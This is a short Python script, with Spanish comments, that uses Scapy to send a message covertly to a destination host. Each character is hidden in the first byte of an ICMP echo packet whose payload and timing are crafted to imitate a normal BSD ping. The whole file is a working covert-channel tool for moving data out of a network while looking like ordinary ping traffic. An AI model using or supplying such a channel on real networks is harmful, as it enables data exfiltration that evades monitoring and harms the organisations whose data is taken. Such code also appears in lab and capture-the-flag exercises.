import sys, os, time
from scapy.all import IP, ICMP, Raw, send

if len(sys.argv) < 3:
    print(f'Uso: sudo python3 {sys.argv[0]} "mensaje" destino')
    sys.exit(1)

msg, dst = sys.argv[1], sys.argv[2]
icmp_id = os.getpid() & 0xFFFF
PAYLOAD_LEN   = 48
SECRET_OFFSET = 0x00     # secreto en el primer byte
INTERVAL      = 1.0      # igual que ping

def build_payload_bsd():
    p = bytearray(PAYLOAD_LEN)
    p[1] = 0x60                      # segundo byte 0x60
    for i in range(6):               # bytes 2..7 = 0x00 (ya están en cero)
        p[2+i] = 0x00
    # bytes 8..47 = 0x10..0x37
    for i, val in enumerate(range(0x10, 0x38)):  # 0x38 es exclusivo
        p[8+i] = val
    return p

seq = 1
for ch in msg:
    payload = build_payload_bsd()
    payload[SECRET_OFFSET] = ord(ch) & 0xFF  # pone tu carácter en el primer byte
    pkt = IP(dst=dst, ttl=64)/ICMP(id=icmp_id, seq=seq)/Raw(load=bytes(payload))
    send(pkt, verbose=1)
    time.sleep(INTERVAL)
    seq += 1
